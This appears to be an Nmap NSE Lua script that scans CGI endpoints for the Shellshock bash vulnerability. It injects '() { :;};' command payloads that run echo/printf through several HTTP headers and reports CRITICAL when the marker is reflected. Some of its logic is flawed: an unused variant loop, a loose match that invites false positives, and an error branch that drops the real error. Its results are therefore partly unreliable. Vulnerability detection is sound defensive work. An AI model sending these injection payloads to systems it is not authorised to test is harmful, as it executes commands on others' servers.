local http = require "http"
local stdnse = require "stdnse"

description = [[Detects Shellshock (CVE-2014-6271, CVE-2014-6277, CVE-2014-6278) in CGI scripts via malicious headers.]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"vuln", "safe"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and port.service == "http" end

action = function(host, port)
  local ok, result = pcall(function()
    local findings = {}
    local server_banner = ""

    local banner_req = http.get(host, port, "/")
    if banner_req and banner_req.headers and banner_req.headers["server"] then
      local sv = banner_req.headers["server"]
      server_banner = type(sv) == "table" and sv[1] or sv
    end

    local cgi_scripts = {
      "/cgi-bin/test.cgi",
      "/cgi-bin/printenv",
      "/cgi-bin/hello",
      "/cgi-sys/printenv",
      "/cgi-bin/php",
      "/cgi-bin/test",
      "/cgi-bin/env",
      "/cgi-bin/test.sh",
      "/cgi-bin/status",
      "/cgi-bin/systeminfo",
    }

    local shellshock_payloads = {
      {header = "User-Agent", value = "() { :;}; echo; echo; printf 'HackIT_Shellshock_UA'"},
      {header = "Cookie", value = "() { :;}; echo; echo; printf 'HackIT_Shellshock_Cookie'"},
      {header = "Referer", value = "() { :;}; echo; echo; printf 'HackIT_Shellshock_Ref'"},
      {header = "X-Forwarded-For", value = "() { :;}; echo; echo; printf 'HackIT_Shellshock_XFF'"},
      {header = "Host", value = "() { :;}; echo; echo; printf 'HackIT_Shellshock_Host'"},
      {header = "Accept", value = "() { :;}; echo; echo; printf 'HackIT_Shellshock_Acc'"},
    }

    local shellshock_variants = {
      "() { :;}; /bin/echo HackIT_Shellshock_Test",
      "() { :;}; echo HackIT_Shellshock_Test",
      "() { :;}; /usr/bin/printf 'HackIT_Shellshock_Test\\n'",
      "() { :;}; /bin/bash -c 'echo HackIT_Shellshock_Test'",
    }

    for _, cgi in ipairs(cgi_scripts) do
      for _, sh in ipairs(shellshock_payloads) do
        local headers = {[sh.header] = sh.value}
        local req = http.get(host, port, cgi, {header = headers})
        if req and req.status then
          local body = req.body or ""
          local resp_headers = req.headers or {}

          for _, variant in ipairs(shellshock_variants) do
            if body:match("HackIT_Shellshock") or body:match("bash") and body:match("echo") then
              local excerpt = body:sub(1, 100):gsub("\n", " "):gsub("\r", "")
              table.insert(findings, {cgi = cgi, header = sh.header, excerpt = excerpt, status = req.status, variant = variant:sub(1, 40)})
              break
            end
          end

          for hname, hval in pairs(resp_headers) do
            local hstr = type(hval) == "table" and table.concat(hval, " ") or tostring(hval)
            if hstr:match("HackIT") then
              table.insert(findings, {cgi = cgi, header = sh.header, excerpt = ("response header %s: %s"):format(hname, hstr:sub(1, 60)), status = req.status, variant = "header reflection"})
              break
            end
          end

          if body:match("HackIT") and not findings[#findings] then
            table.insert(findings, {cgi = cgi, header = sh.header, excerpt = body:sub(1, 80), status = req.status, variant = "body reflection"})
          end
        end
      end
    end

    if #findings > 0 then
      local result = stdnse.output_table()
      result.cve = "CVE-2014-6271, CVE-2014-6277, CVE-2014-6278"
      result.severity = "CRITICAL"
      result.vulnerable = true
      result.server = server_banner
      result.detail = ("Shellshock (CVE-2014-6271) confirmed in CGI scripts via %d vector(s)"):format(#findings)
      for i, f in ipairs(findings) do
        result[("vector_%d"):format(i)] = ("CGI %s via %s header (HTTP %d): %s"):format(f.cgi, f.header, f.status, f.excerpt)
      end
      return result
    end

    local result = stdnse.output_table()
    result.cve = "CVE-2014-6271"
    result.severity = "LOW"
    result.vulnerable = false
    result.server = server_banner
    result.detail = "No Shellshock detected in CGI scripts"
    return result
  end)
  if not ok then
    local result = stdnse.output_table()
    result.cve = "CVE-2014-6271"
    result.severity = "MEDIUM"
    result.vulnerable = false
    result.detail = "Error during scan: " .. tostring(result)
    result.error = true
    return result
  end
  return result
end
